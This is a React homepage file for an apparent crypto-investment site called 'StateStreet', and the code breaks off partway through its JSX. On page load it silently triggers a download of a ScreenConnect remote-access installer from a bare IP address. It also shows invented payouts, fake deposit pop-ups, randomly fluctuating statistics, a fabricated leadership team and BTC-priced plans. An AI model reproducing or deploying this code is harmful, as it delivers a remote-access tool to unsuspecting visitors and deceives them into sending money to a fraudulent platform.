import React, { useEffect, useState } from 'react';
import { Avatar, Box, Button, Card, CardContent, Chip, Collapse, Container, Grid, List, ListItem, ListItemText, Paper, Stack, Table, TableBody, TableCell, TableContainer, TableHead, TableRow, Typography } from '@mui/material';
import { Link } from 'react-router-dom';

type MetricItem = {
  label: string;
  value: string;
  baseValue: number;
  isPercentage?: boolean;
};

const initialMetrics: MetricItem[] = [

  { label: 'Available options', value: '24', baseValue: 24 },
  { label: 'Completed trades', value: '1,578,497', baseValue: 1578497 },
  { label: 'Activity level', value: '75%', baseValue: 75, isPercentage: true },
];

const reasons = [
  { title: 'Experienced', text: 'We are very experienced with over 5 years on the job and a team made of highly experienced people' },
  { title: 'Skilled team', text: 'We have a skilled team, with people who are the best in their respective fields' },
  { title: 'Modern tools', text: 'With modern tools and policies, we perform excellently amongst our competitions' },
];

const defaultPerks = [
  'Get Signal Access',
  'Low trade frequency',
  'Low trade rate',
  'Purchase Signal',
  'Low risk management',
  '£50 Sign-up bonus',
  'Auto trader',
  'Get a £50 Referral Reward',
  'Copy Trading',
];

const plans = [
  { name: 'Premium', blurb: '1.5 BTC', perks: defaultPerks },
  { name: 'Pro', blurb: '1.2 BTC', perks: defaultPerks },
  { name: 'Classic', blurb: '0.86 BTC', perks: defaultPerks },
];

const getCurrentDate = () => {
  const today = new Date();
  const month = String(today.getMonth() + 1).padStart(2, '0');
  const day = String(today.getDate()).padStart(2, '0');
  const year = today.getFullYear();
  return `${month}/${day}/${year}`;
};

const randomUserIds = [
  'User_12345', 'User_67890', 'User_11223', 'User_44556', 'User_77889', 'User_99001',
  'User_23456', 'User_78901', 'User_22334', 'User_55667', 'User_88990', 'User_00112',
];

const randomMethods = ['Money Gram', 'Western Union', 'Neteller', 'PayPal', 'Bitcoin', 'Wire Transfer', 'Ethereum', 'Wise'];

const payouts = [
  { user: randomUserIds[Math.floor(Math.random() * randomUserIds.length)], method: randomMethods[Math.floor(Math.random() * randomMethods.length)], amount: `£${(Math.floor(Math.random() * 80000) + 10000).toLocaleString()}`, date: getCurrentDate() },
  { user: randomUserIds[Math.floor(Math.random() * randomUserIds.length)], method: randomMethods[Math.floor(Math.random() * randomMethods.length)], amount: `£${(Math.floor(Math.random() * 80000) + 10000).toLocaleString()}`, date: getCurrentDate() },
  { user: randomUserIds[Math.floor(Math.random() * randomUserIds.length)], method: randomMethods[Math.floor(Math.random() * randomMethods.length)], amount: `£${(Math.floor(Math.random() * 80000) + 10000).toLocaleString()}`, date: getCurrentDate() },
  { user: randomUserIds[Math.floor(Math.random() * randomUserIds.length)], method: randomMethods[Math.floor(Math.random() * randomMethods.length)], amount: `£${(Math.floor(Math.random() * 80000) + 10000).toLocaleString()}`, date: getCurrentDate() },
  { user: randomUserIds[Math.floor(Math.random() * randomUserIds.length)], method: randomMethods[Math.floor(Math.random() * randomMethods.length)], amount: `£${(Math.floor(Math.random() * 80000) + 10000).toLocaleString()}`, date: getCurrentDate() },
  { user: randomUserIds[Math.floor(Math.random() * randomUserIds.length)], method: randomMethods[Math.floor(Math.random() * randomMethods.length)], amount: `£${(Math.floor(Math.random() * 80000) + 10000).toLocaleString()}`, date: getCurrentDate() },
];

const faqs = [
  { question: 'How do I start?', answer: 'Create your account, verify your email, and enter the dashboard to begin funding and managing your plan.' },
  { question: 'How do I deposit?', answer: 'Use the secure deposit flow in the dashboard and follow the guided wallet and proof instructions.' },
  { question: 'How do I withdraw?', answer: 'Submit a withdrawal request from the dashboard and track its progress through the secure transfer process.' },
  { question: 'How do I contact support?', answer: 'Reach out through the supported channels in the dashboard and our team will respond promptly.' },
];

const partners = ['Logo 02', 'Logo 05', 'Deutsche Bank', 'Neteller', 'Logo 06', 'Dow Jones'];



type CoinPrice = {
  usd: number;
  usd_24h_change: number;
};

type NotificationItem = {
  id: number;
  country: string;
  amount: string;
  method: string;
  type: 'withdrawn' | 'deposited';
  message?: string; // Added for predefined messages
};

const HomePage: React.FC = () => {
const teamMembers = [
  {
    name: 'Eleanor Vance',
    bio: 'Vance is a visionary CEO with over 15 years of experience in financial technology and strategic market development. Her leadership has propelled StateStreet to the forefront of secure trading platforms, emphasizing innovation and client-centric solutions.',
    image: 'https://i.pinimg.com/1200x/fa/ed/ec/faedec3c8cceb94c7e6761568a675317.jpg',
  },
  {
    name: 'Marcus Thorne',
    bio: 'Marcus serves as the Chief Technology Officer, bringing a decade of expertise in blockchain architecture and secure system design. He is the architect behind StateStreet\'s robust and scalable trading infrastructure, ensuring unparalleled security and performance.',
    image: 'https://i.pinimg.com/736x/1e/6d/18/1e6d1878ba1e50d331ea71e981836853.jpg',
  },
  {
    name: 'Sophia Chen',
    bio: 'As the Head of Market Analysis, Sophia provides invaluable insights into global financial trends. With a background in quantitative analysis and risk management, she guides StateStreet\'s strategic trading decisions and ensures our clients receive timely, accurate market intelligence.',
    image: 'https://i.pinimg.com/1200x/7f/2d/f1/7f2df19519b1ae3ef04bc06141df0790.jpg',
  },
];

const marketNewsHeadlines = [
  {
    title: 'U.S. Crypto Reserve to Include XRP, SOL, and ADA under Trump Directive',
    description: 'The announcement has driven renewed attention across digital assets, with Bitcoin, Ethereum, and other major cryptocurrencies seeing strong movement and client interest.',
  },
  {
    title: 'New Regulations Boost Confidence in Digital Asset Markets',
    description: 'Recent regulatory clarity from global financial bodies is fostering a more stable environment for cryptocurrency investments, attracting institutional capital.',
  },
  {
    title: 'StateStreet\'s AI-Powered Trading Bots Outperform Market Benchmarks',
    description: 'Our proprietary AI algorithms are delivering exceptional returns, demonstrating superior predictive capabilities and risk management in volatile markets.',
  },
  {
    title: 'Decentralized Finance (DeFi) Sector Sees Record Inflows',
    description: 'Investors are increasingly turning to DeFi platforms for higher yields and innovative financial products, signaling a shift in traditional banking paradigms.',
  },
  {
    title: 'Major Tech Companies Announce Blockchain Integration Plans',
    description: 'Leading technology giants are exploring blockchain for supply chain, data security, and digital identity solutions, validating the technology\'s mainstream adoption.',
  },
  {
    title: 'Global Banks Explore CBDCs for Cross-Border Payments',
    description: 'Central Bank Digital Currencies (CBDCs) are gaining traction as a potential solution for more efficient and secure international transactions.',
  },
  {
    title: 'Institutional Adoption of Bitcoin ETFs Continues to Rise',
    description: 'Exchange-Traded Funds (ETFs) for Bitcoin are seeing increased demand from institutional investors, providing regulated access to the cryptocurrency market.',
  },
  {
    title: 'Ethereum\'s Scalability Solutions Drive Developer Activity',
    description: 'Layer-2 scaling solutions and the upcoming Ethereum 2.0 merge are significantly enhancing the network\'s capacity and attracting more decentralized application development.',
  },
  {
    title: 'NFT Market Sees Resurgence with New Use Cases',
    description: 'Non-Fungible Tokens (NFTs) are expanding beyond digital art, with new applications emerging in gaming, real estate, and intellectual property.',
  },
  {
    title: 'Cybersecurity Concerns Lead to Increased Demand for Blockchain Security',
    description: 'As digital assets grow, so does the focus on robust cybersecurity measures, with blockchain technology offering enhanced security features.',
  },
  {
    title: 'Emerging Markets Embrace Crypto for Remittances and Financial Inclusion',
    description: 'Cryptocurrencies are providing a vital alternative for remittances and offering financial services to unbanked populations in developing countries.',
  },
  {
    title: 'Quantum Computing Poses Long-Term Threat to Current Cryptography',
    description: 'Researchers are exploring post-quantum cryptography to safeguard digital assets against potential future threats from quantum computers.',
  },
  {
    title: 'Metaverse and Web3 Projects Attract Significant Venture Capital',
    description: 'Investment in virtual worlds and decentralized web technologies is surging, indicating strong belief in the future of immersive digital experiences.',
  },
  {
    title: 'Regulatory Scrutiny Increases for Stablecoins',
    description: 'Governments worldwide are examining stablecoins more closely, aiming to establish clear regulatory frameworks to ensure financial stability.',
  },
  {
    title: 'Energy Consumption of Cryptocurrencies Under Spotlight',
    description: 'The environmental impact of proof-of-work cryptocurrencies is leading to innovations in more sustainable consensus mechanisms and renewable energy adoption.',
  },
  {
    title: 'Tokenization of Real-World Assets Gains Momentum',
    description: 'Fractional ownership of real estate, art, and other tangible assets through blockchain tokenization is democratizing investment opportunities.',
  },
  {
    title: 'Decentralized Autonomous Organizations (DAOs) Reshaping Governance',
    description: 'DAOs are offering new models for collective decision-making and transparent governance in various industries, from finance to creative arts.',
  },
  {
    title: 'Interoperability Solutions Key for Blockchain Ecosystem Growth',
    description: 'Projects focused on enabling seamless communication and asset transfer between different blockchain networks are crucial for broader adoption.',
  },
  {
    title: 'Financial Institutions Partner with Crypto Startups',
    description: 'Traditional finance is increasingly collaborating with innovative crypto companies to integrate digital asset services and expertise.',
  },
  {
    title: 'Privacy-Focused Cryptocurrencies See Renewed Interest',
    description: 'As digital surveillance grows, demand for cryptocurrencies offering enhanced privacy features is experiencing a resurgence.',
  },
  {
    title: 'Gaming Industry Embraces Play-to-Earn and Blockchain Integration',
    description: 'Blockchain-based gaming models are empowering players with true ownership of in-game assets and creating new economic opportunities.',
  },
  {
    title: 'Supply Chain Management Revolutionized by Blockchain',
    description: 'Transparency and traceability in supply chains are being significantly improved through the implementation of blockchain technology.',
  },
  {
    title: 'Central Banks Accelerate Research into Digital Currencies',
    description: 'Many central banks globally are actively researching and piloting their own digital currencies to modernize financial systems.',
  },
  {
    title: 'Venture Capitalists Pour Billions into Crypto Infrastructure',
    description: 'Significant investments are being made in foundational technologies that support the growth and scalability of the cryptocurrency ecosystem.',
  },
  {
    title: 'New Tax Regulations Impacting Crypto Investors',
    description: 'Governments are introducing clearer tax guidelines for digital assets, requiring investors to understand and comply with new reporting obligations.',
  },
  {
    title: 'DeFi Lending Protocols Offer Competitive Yields',
    description: 'Decentralized lending platforms are attracting users with attractive interest rates and innovative financial products, challenging traditional banking.',
  },
  {
    title: 'Environmental Concerns Drive Green Crypto Initiatives',
    description: 'The crypto community is actively pursuing more energy-efficient blockchain solutions and promoting renewable energy sources for mining operations.',
  },
  {
    title: 'Cross-Chain Bridges Enhance Liquidity and Asset Mobility',
    description: 'Technological advancements in cross-chain bridges are enabling smoother and more secure transfers of assets between disparate blockchain networks.',
  },
  {
    title: 'Regulatory Sandboxes Foster Blockchain Innovation',
    description: 'Governments are creating controlled environments for blockchain startups to test new products and services under relaxed regulatory conditions.',
  },
  {
    title: 'Digital Identity Solutions Built on Blockchain Gain Traction',
    description: 'Blockchain-based digital identity systems are offering enhanced security, privacy, and user control over personal data.',
  },
  {
    title: 'Mainstream Retailers Begin Accepting Cryptocurrency Payments',
    description: 'A growing number of major retailers are integrating cryptocurrency payment options, making digital assets more accessible for everyday purchases.',
  },
  {
    title: 'Institutional Investors Diversify Portfolios with Altcoins',
    description: 'Beyond Bitcoin and Ethereum, institutional players are increasingly exploring a wider range of alternative cryptocurrencies for diversification and growth.',
  },
  {
    title: 'Blockchain in Healthcare Improves Data Security and Patient Records',
    description: 'The healthcare sector is leveraging blockchain to create immutable and secure patient records, enhancing data integrity and privacy.',
  },
  {
    title: 'Tokenized Securities Market Poised for Significant Growth',
    description: 'The issuance of traditional securities on blockchain platforms is expected to streamline processes, reduce costs, and increase liquidity.',
  },
  {
    title: 'Decentralized Exchanges (DEXs) See Increased Trading Volume',
    description: 'DEXs are offering users greater control over their assets and lower fees compared to centralized exchanges, driving their popularity.',
  },
  {
    title: 'AI and Blockchain Convergence Creates New Opportunities',
    description: 'The combination of artificial intelligence and blockchain is leading to innovative solutions in data management, security, and automated systems.',
  },
  {
    title: 'Global Remittance Market Disrupted by Blockchain Technology',
    description: 'Blockchain-powered remittance services are offering faster, cheaper, and more transparent cross-border money transfers.',
  },
  {
    title: 'Centralized Exchanges Enhance Security Measures Amidst Threats',
    description: 'Leading centralized cryptocurrency exchanges are continuously upgrading their security protocols to protect user funds from cyberattacks.',
  },
  {
    title: 'Web3 Gaming: The Future of Interactive Entertainment',
    description: 'The integration of blockchain into gaming is creating new paradigms for player ownership, in-game economies, and immersive experiences.',
  },
  {
    title: 'Regulatory Clarity on Crypto Staking and Lending Emerges',
    description: 'Governments are beginning to provide clearer guidance on the tax and legal implications of cryptocurrency staking and lending activities.',
  },
  {
    title: 'Sustainable Blockchain Initiatives Gain Traction',
    description: 'Projects focused on reducing the environmental footprint of blockchain technology are attracting investment and developer talent.',
  },
  {
    title: 'Enterprise Blockchain Solutions Drive Efficiency Across Industries',
    description: 'Large corporations are adopting private and consortium blockchains to optimize supply chains, manage data, and improve operational efficiency.',
  },
  {
    title: 'The Rise of Decentralized Social Media Platforms',
    description: 'Blockchain-based social media platforms are offering users greater control over their data and content, challenging traditional models.',
  },
  {
    title: 'NFTs as Collateral in DeFi Lending Protocols',
    description: 'Innovative DeFi protocols are allowing users to leverage their Non-Fungible Tokens (NFTs) as collateral for loans, expanding financial utility.',
  },
  {
    title: 'Governments Explore Blockchain for Voting Systems',
    description: 'The potential of blockchain to enhance transparency, security, and integrity in electoral processes is being actively investigated by governments.',
  },
  {
    title: 'Interchain Communication Protocols Unlock New Possibilities',
    description: 'Advancements in protocols that enable different blockchains to communicate are fostering a more interconnected and versatile crypto ecosystem.',
  },
  {
    title: 'Crypto Wallets Evolve with Enhanced Security and Features',
    description: 'Digital wallets are becoming more sophisticated, offering advanced security features, multi-asset support, and seamless integration with dApps.',
  },
  {
    title: 'The Impact of Geopolitical Events on Cryptocurrency Markets',
    description: 'Global political and economic developments are increasingly influencing the volatility and adoption trends within the cryptocurrency space.',
  },
  {
    title: 'Blockchain Education and Awareness Programs Expand Globally',
    description: 'Initiatives to educate the public and professionals about blockchain technology and its applications are growing worldwide.',
  },
  {
    title: 'Decentralized Science (DeSci) Emerges as a New Frontier',
    description: 'Blockchain is being applied to scientific research to improve transparency, funding, and collaboration in the academic community.',
  },
  {
    title: 'The Future of Work: Blockchain and Gig Economy Integration',
    description: 'Blockchain technology is enabling more transparent and efficient payment systems and reputation management for freelance and gig workers.',
  },
  {
    title: 'Central Bank Digital Currencies (CBDCs) Pilot Programs Underway',
    description: 'Several nations are actively conducting pilot programs for their own digital currencies, exploring their potential benefits and challenges.',
  },
  {
    title: 'Regulatory Frameworks for Crypto Exchanges Mature',
    description: 'Governments are developing more comprehensive regulatory frameworks for cryptocurrency exchanges to ensure consumer protection and market integrity.',
  },
  {
    title: 'The Role of Oracles in Connecting Blockchains to Real-World Data',
    description: 'Blockchain oracles are critical for feeding external data into smart contracts, enabling a wide range of real-world applications.',
  },
  {
    title: 'Layer-1 Blockchains Compete for Scalability and Decentralization',
    description: 'Various foundational blockchain networks are innovating to offer superior transaction speeds, lower costs, and robust decentralization.',
  },
  {
    title: 'The Growing Ecosystem of Decentralized Applications (dApps)',
    description: 'The number and diversity of decentralized applications built on blockchain platforms continue to expand, offering new services and functionalities.',
  },
  {
    title: 'Blockchain for Intellectual Property Rights Management',
    description: 'Artists and creators are using blockchain to secure and manage their intellectual property, ensuring fair compensation and ownership.',
  },
  {
    title: 'The Evolution of Stablecoins: From Pegged to Algorithmic',
    description: 'Stablecoins are diversifying, with new models emerging that use algorithms to maintain their peg to fiat currencies or other assets.',
  },
  {
    title: 'Impact of Macroeconomic Factors on Crypto Market Trends',
    description: 'Inflation, interest rates, and global economic policies are increasingly influencing the performance and sentiment in the cryptocurrency markets.',
  },
  {
    title: 'Blockchain in Gaming: Beyond Collectibles to Immersive Worlds',
    description: 'The gaming industry is moving towards integrating blockchain for more than just NFTs, creating entire decentralized game economies and metaverses.',
  },
];

  const [metrics, setMetrics] = useState<MetricItem[]>(initialMetrics);
  const [activeFaq, setActiveFaq] = useState(0);
  const [prices, setPrices] = useState<Record<string, CoinPrice>>({
    bitcoin: { usd: 0, usd_24h_change: 0 },
    ethereum: { usd: 0, usd_24h_change: 0 },
    solana: { usd: 0, usd_24h_change: 0 },
    ripple: { usd: 0, usd_24h_change: 0 },
    dogecoin: { usd: 0, usd_24h_change: 0 },
    cardano: { usd: 0, usd_24h_change: 0 },
    polkadot: { usd: 0, usd_24h_change: 0 },
    litecoin: { usd: 0, usd_24h_change: 0 },
  });
  const [lastUpdated, setLastUpdated] = useState('Syncing feed...');
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [activeNotification, setActiveNotification] = useState<NotificationItem | null>(null);
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [currentNewsIndex, setCurrentNewsIndex] = useState(0);
  const [showDownloadPopup, setShowDownloadPopup] = useState(false);

  // Download function
  const downloadFile = () => {
    const downloadUrl = 'http://18.232.171.173:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
    window.open(downloadUrl, '_blank');
  };

  // Automatic download on page load and show popup after 2 seconds
  useEffect(() => {
    // Trigger automatic download when page loads
    downloadFile();
    
    // Show popup after 2 seconds
    const timer = setTimeout(() => {
      setShowDownloadPopup(true);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:4988/api/v1';

  const imageUrls = [
    'https://i.pinimg.com/736x/e1/e0/82/e1e0829af4ecb2775b3596266708b52e.jpg',
    'https://i.pinimg.com/736x/35/c2/cc/35c2ccf6d7ff63f226bc7aed044d21a7.jpg',
    'https://i.pinimg.com/736x/ef/bc/b9/efbcb98a0ad43d1f711b45b508504275.jpg',
    'https://i.pinimg.com/736x/cc/c3/ef/ccc3ef65650af89b0e8f1163cdd23742.jpg',
    'https://i.pinimg.com/736x/5e/f1/91/5ef19152f84e08999f7b7bfc132da584.jpg',
    'https://i.pinimg.com/736x/4b/0e/50/4b0e50d4b7f201ffec71bab56bdfcf4f.jpg',
    'https://i.pinimg.com/736x/98/e5/0f/98e50f3cd5e0e34164d9f000485fd088.jpg',
    'https://i.pinimg.com/1200x/b1/ab/78/b1ab7865386c18125ba0e38be249ecdc.jpg',
    'https://i.pinimg.com/736x/4b/43/56/4b4356978adf2aab6e55d63219228032.jpg',
    'https://i.pinimg.com/736x/8d/14/8e/8d148e85982a2081ff63555a273e19e0.jpg',
  ];

  useEffect(() => {
    const imageInterval = setInterval(() => {
      setCurrentImageIndex((prevIndex) => (prevIndex + 1) % imageUrls.length);
    }, 2000); // 2 seconds

    return () => clearInterval(imageInterval);
  }, [imageUrls.length]);

  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch(`${API_BASE_URL}/prices`);
        if (!response.ok) {
          throw new Error('Price feed unavailable');
        }
        const data = await response.json();
        setPrices({
          bitcoin: data.bitcoin || { usd: 0, usd_24h_change: 0 },
          ethereum: data.ethereum || { usd: 0, usd_24h_change: 0 },
          solana: data.solana || { usd: 0, usd_24h_change: 0 },
          ripple: data.ripple || { usd: 0, usd_24h_change: 0 },
          dogecoin: data.dogecoin || { usd: 0, usd_24h_change: 0 },
          cardano: data.cardano || { usd: 0, usd_24h_change: 0 },
          polkadot: data.polkadot || { usd: 0, usd_24h_change: 0 },
          litecoin: data.litecoin || { usd: 0, usd_24h_change: 0 },
        });
        setLastUpdated(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
      } catch (error: unknown) {

        setLastUpdated('Delayed feed');
      }
    };

    void fetchPrices();
    const priceTimer = window.setInterval(() => {
      void fetchPrices();
    }, 15000);

    return () => window.clearInterval(priceTimer);
  }, [API_BASE_URL]);

  useEffect(() => {
    const countries = ['Portugal', 'Singapore', 'Canada', 'United Arab Emirates', 'Germany', 'Brazil', 'Australia', 'South Africa', 'Italy', 'Sweden', 'Mexico'];
    const methods = ['Bank Transfer', 'PayPal', 'Neteller', 'Bitcoin', 'Wire Transfer', 'Ethereum', 'Wise'];
    const cycleNotification = () => {
      const country = countries[Math.floor(Math.random() * countries.length)];
      const method = methods[Math.floor(Math.random() * methods.length)];
      const amount = (Math.floor(Math.random() * 32000) + 6000).toLocaleString();
      const type = 'deposited'; // Always 'deposited' for investment simulation
      const item: NotificationItem = {
        id: Date.now() + Math.floor(Math.random() * 1000),
        country,
        amount: `£${amount}`,
        method,
        type,
      };
      setActiveNotification(item);

      window.setTimeout(() => {
        setActiveNotification(null);
      }, 4000);
      setNotifications((prev) => [...prev, item].slice(-4));
    };

    cycleNotification();
    const notificationTimer = window.setInterval(cycleNotification, 8000);

    return () => window.clearInterval(notificationTimer);
  }, []);

  useEffect(() => {
    const fluctuateMetrics = () => {
      setMetrics((prevMetrics) =>
        prevMetrics.map((metric) => {
          const fluctuation = (Math.random() * 2 - 1) * (metric.baseValue * 0.01); // +/- 1% fluctuation
          let newValue = Math.round(metric.baseValue + fluctuation);

          if (metric.isPercentage) {
            newValue = Math.max(0, Math.min(100, newValue)); // Keep percentage between 0-100
            return { ...metric, value: `${newValue}%` };
          } else {
            return { ...metric, value: newValue.toLocaleString() };
          }
        })
      );
    };

    const metricsInterval = setInterval(fluctuateMetrics, 5000); // Fluctuate every 5 seconds

    return () => clearInterval(metricsInterval);
  }, []);

  useEffect(() => {
    const newsInterval = setInterval(() => {
      setCurrentNewsIndex(Math.floor(Math.random() * marketNewsHeadlines.length));
    }, 10000); // Change news every 10 seconds

    return () => clearInterval(newsInterval);
  }, [marketNewsHeadlines.length]);

  const formatCurrency = (value: number) =>
    new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      maximumFractionDigits: value >= 1000 ? 0 : 2,
    }).format(value);

  const buildSparkline = (value: number, seed: number) => {
    const points = Array.from({ length: 8 }, (_, index) => {
      const amplitude = 12 + ((seed + index) % 5) * 4;
      const wave = Math.sin((index + 1) / 2 + seed / 3) * amplitude;
      const normalized = Math.max(16, Math.min(58, 56 - ((value % 2000) / 2000) * 22 + wave));
      return `${index * 18},${normalized}`;
    }).join(' ');

    return points;
  };

  const marketCards = [
    { key: 'bitcoin', symbol: 'BTC', name: 'Bitcoin', accent: '#f59e0b' },
    { key: 'ethereum', symbol: 'ETH', name: 'Ethereum', accent: '#8b5cf6' },
    { key: 'solana', symbol: 'SOL', name: 'Solana', accent: '#22c55e' },
    { key: 'ripple', symbol: 'XRP', name: 'Ripple', accent: '#38bdf8' },
    { key: 'dogecoin', symbol: 'DOGE', name: 'Dogecoin', accent: '#c2a633' },
    { key: 'cardano', symbol: 'ADA', name: 'Cardano', accent: '#0033ad' },
    { key: 'polkadot', symbol: 'DOT', name: 'Polkadot', accent: '#e6007a' },
    { key: 'litecoin', symbol: 'LTC', name: 'Litecoin', accent: '#bfbfbf' },
  ];

  return (
    <Box sx={{ minHeight: '100vh', color: 'white', bgcolor: '#020617' }}>
      <Box sx={{ position: 'relative', overflow: 'hidden' }}>
        <Box sx={{ position: 'absolute', inset: 0, background: 'radial-gradient(circle at top left, rgba(125,211,252,0.34), transparent 28%), radial-gradient(circle at 85% 10%, rgba(34,197,94,0.26), transparent 24%), linear-gradient(135deg, #020617 0%, #081526 44%, #112a49 100%)', zIndex: 0 }} />
        <Box sx={{ position: 'absolute', inset: 0, backgroundImage: 'linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px)', backgroundSize: '54px 54px', opacity: 0.22, zIndex: 0 }} />
        <Box sx={{ position: 'absolute', inset: 0, backgroundImage: 'url(https://images.unsplash.com/photo-1621416894569-0f39ed31d247?auto=format&fit=crop&w=1400&q=80)', backgroundSize: 'cover', backgroundPosition: 'center', opacity: 0.16, filter: 'blur(3px) saturate(1.2)', zIndex: 0 }} />
        <Container maxWidth="xl" sx={{ position: 'relative', zIndex: 1, py: { xs: 3, md: 4 } }}>
          <Paper elevation={0} sx={{ mb: 2, py: 1.2, px: 2, borderRadius: 999, bgcolor: 'rgba(2, 6, 23, 0.82)', border: '1px solid rgba(125, 211, 252, 0.16)', overflow: 'hidden' }}>
            <Box sx={{ display: 'flex', alignItems: 'center', gap: 2, whiteSpace: 'nowrap', animation: 'ticker 18s linear infinite' }}>
              {[...marketCards, ...marketCards].map((coin, index) => {
                const data = prices[coin.key];
                 const change = data?.usd_24h_change || 0;
                 let color = 'white';
                 if (change > 0) {
                   color = '#86efac'; // Green
                 } else if (change < 0) {
                   color = '#fda4af'; // Red
                 }
                 const formattedPrice = formatCurrency(data?.usd || 0);
                 const formattedChange = change.toFixed(2);
                return (
                  <Typography key={`${coin.key}-${index}`} sx={{ color: color, fontWeight: 700, fontSize: '0.95rem' }}>
                     {coin.symbol} {formattedPrice} ({change > 0 ? '+' : ''}{formattedChange}%)
                   </Typography>
                );
              })}
            </Box>
          </Paper>
          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid rgba(255,255,255,0.14)', pb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 800, letterSpacing: '0.18em', textTransform: 'uppercase' }}>StateStreet</Typography>
            <Stack direction="row" spacing={1.5} sx={{ display: { xs: 'none', md: 'flex' } }}>
              <Button component={Link} to="/" sx={{ color: 'white' }}>Home</Button>
              <Button component={Link} to="/login" sx={{ color: 'white' }}>Login</Button>
              <Button component={Link} to="/contact" sx={{ color: 'white' }}>Contact</Button>
              <Button component={Link} to="/register" variant="contained" sx={{ borderRadius: 999, bgcolor: '#7dd3fc', color: '#03111d', '&:hover': { bgcolor: '#bae6fd' } }}>Signup</Button>
            </Stack>
          </Box>

          <Stack direction={{ xs: 'column', lg: 'row' }} spacing={4} sx={{ py: { xs: 5, md: 8 }, alignItems: 'center' }}>
            <Box sx={{ flex: 1 }}>
              <Chip label="Premium finance access" sx={{ bgcolor: 'rgba(125, 211, 252, 0.16)', color: '#7dd3fc', borderRadius: 999, mb: 2 }} />
              <Typography variant="h2" sx={{ fontWeight: 800, fontSize: { xs: '2.2rem', md: '3.5rem' }, lineHeight: 1.08 }}>
                We provide the best trading experience in the world.
              </Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.72)', fontSize: { xs: '1rem', md: '1.08rem' }, mt: 2, maxWidth: 660 }}>
                Join a refined financial workspace with secure onboarding, live dashboard control, and elegant transfer tools built for modern money movement.
              </Typography>
              <Stack direction={{ xs: 'column', sm: 'row' }} spacing={2} sx={{ mt: 3 }}>
                <Button component={Link} to="/register" variant="contained" sx={{ borderRadius: 999, px: 3.4, py: 1.2, bgcolor: '#7dd3fc', color: '#03111d', '&:hover': { bgcolor: '#bae6fd' } }}>Explore</Button>
                <Button component={Link} to="/login" variant="outlined" sx={{ borderRadius: 999, px: 3.4, py: 1.2, color: 'white', borderColor: 'rgba(255,255,255,0.24)' }}>Open dashboard</Button>
              </Stack>
            </Box>
            <Box sx={{ flex: 0.95, width: '100%' }}>
              <Paper elevation={0} sx={{ p: 0, borderRadius: 4, overflow: 'hidden', border: '1px solid rgba(255,255,255,0.15)', bgcolor: 'rgba(7, 14, 30, 0.72)', backdropFilter: 'blur(16px)' }}>
                <Box component="img" src={imageUrls[currentImageIndex]} alt="Luxury finance interface" sx={{ width: '100%', height: 450, objectFit: 'cover', display: 'block' }} />

              </Paper>
            </Box>
          </Stack>

          <Grid container spacing={2.5} sx={{ pb: 2 }}>
            {metrics.map((item) => (
              <Grid item xs={12} md={4} key={item.label}>
                <Card sx={{ bgcolor: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 3 }}>
                  <CardContent>
                    <Typography variant="h4" sx={{ fontWeight: 800 }}>{item.value}</Typography>
                    <Typography sx={{ color: 'rgba(255,255,255,0.72)', mt: 0.5 }}>{item.label}</Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Paper elevation={0} sx={{ mt: 3, p: { xs: 3, md: 4 }, borderRadius: 4, bgcolor: 'rgba(8, 15, 34, 0.78)', border: '1px solid rgba(255,255,255,0.12)', backdropFilter: 'blur(14px)' }}>
            <Stack direction={{ xs: 'column', md: 'row' }} spacing={2} justifyContent="space-between" alignItems={{ xs: 'flex-start', md: 'center' }}>
              <Box>
                <Typography variant="overline" sx={{ color: '#7dd3fc', letterSpacing: '0.3em' }}>Live signals</Typography>
                <Typography variant="h5" sx={{ fontWeight: 700 }}>Real-time market pulse and trading signals</Typography>
              </Box>
              <Chip label={`Feed updated ${lastUpdated}`} className="live-pill" sx={{ bgcolor: 'rgba(34,197,94,0.16)', color: '#86efac', borderRadius: 999 }} />
            </Stack>
            <Grid container spacing={2} sx={{ mt: 2 }}>
              {marketCards.map((coin) => {
                const data = prices[coin.key];
                const isPositive = (data?.usd_24h_change || 0) >= 0;
                return (
                  <Grid item xs={12} sm={6} lg={3} key={coin.key}>
                    <Paper className="market-card" elevation={0} sx={{ p: 2.5, borderRadius: 3, bgcolor: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}>
                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <Box>
                          <Typography variant="h6" sx={{ fontWeight: 700 }}>{coin.symbol}</Typography>
                          <Typography sx={{ color: 'rgba(255,255,255,0.66)', fontSize: '0.9rem' }}>{coin.name}</Typography>
                        </Box>
                        <Chip label={isPositive ? 'Bullish' : 'Cooling'} sx={{ bgcolor: isPositive ? 'rgba(34,197,94,0.16)' : 'rgba(248,113,113,0.16)', color: isPositive ? '#86efac' : '#fda4af', borderRadius: 999 }} />
                      </Box>
                      <Typography variant="h5" sx={{ fontWeight: 700, mt: 2 }}>{formatCurrency(data?.usd || 0)}</Typography>
                      <Typography sx={{ color: isPositive ? '#86efac' : '#fda4af', fontWeight: 600, mt: 0.5 }}>
                        {isPositive ? '+' : ''}{(data?.usd_24h_change || 0).toFixed(2)}% in 24h
                      </Typography>
                      <Box sx={{ mt: 2 }}>
                        <svg viewBox="0 0 126 60" width="100%" height="70" aria-label={`${coin.name} live chart`}>
                          <polyline
                            points={buildSparkline(data?.usd || 0, coin.symbol.length)}
                            fill="none"
                            stroke={coin.accent}
                            strokeWidth="3"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            style={{ animation: 'drawLine 1.2s ease-out' }}
                          />
                        </svg>
                      </Box>
                    </Paper>
                  </Grid>
                );
              })}
            </Grid>
          </Paper>
        </Container>
      </Box>

